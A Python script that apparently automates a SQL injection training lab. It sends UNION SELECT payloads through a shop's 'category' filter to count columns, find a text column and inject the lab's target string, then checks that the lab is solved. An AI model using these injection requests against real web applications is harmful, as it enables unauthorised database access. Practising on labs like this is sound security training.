from base.base import Base
from bs4 import BeautifulSoup

class SQL(Base):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    def _add_args(self):
        pass

    def _determine_number_of_columns(self):
        for i in range(1, 10):
            response = self.session.get(f"{self.base_url}/filter?category=Gifts' union select null{(i*",null")} -- ")
            if response.status_code == 200:
                return i+1
        return None
    
    def _get_text_to_return(self):
        response = self.session.get(f"{self.base_url}")
        soup = BeautifulSoup(response.text, "html.parser")
        text=soup.find("p", id="hint").text
        return text.split(": ")[1]
    
    def _identify_text_column(self, number_of_columns):
        for i in range(0, number_of_columns):
            temp_payload = ["null"] * number_of_columns
            temp_payload[i] = "'aaa'"
            payload = ', '.join(temp_payload)

            response = self.session.get(f"{self.base_url}/filter?category=Gifts' union select {payload} -- ")
            if response.status_code == 200:
                return i
            
        return None
  
        
    def run(self):
        number_of_columns = self._determine_number_of_columns()
        self.log(f"Number of columns: {number_of_columns}", "verbose")

        text_to_return = self._get_text_to_return()
        self.log(f"Extracted text to return: {text_to_return}", "verbose")

        text_column = self._identify_text_column(number_of_columns)
        
        self.log(f"Identified text column: {str(text_column+1)}", "verbose")

        final_payload = []
        for i in range(0, number_of_columns):
            temp_payload = ["null"] * number_of_columns
            temp_payload[text_column] = f"{text_to_return}"
        
        final_payload = ', '.join(temp_payload)

        self.log(f"Final payload: {final_payload}", "verbose")

        response = self.session.get(f"{self.base_url}/filter?category=Gifts' union select {final_payload} -- ") 
            
        self.log(f"Response status code: {response.status_code}", "verbose")

        self.is_lab_solved()
    

if __name__ == "__main__":
    sql = SQL()
    sql.run()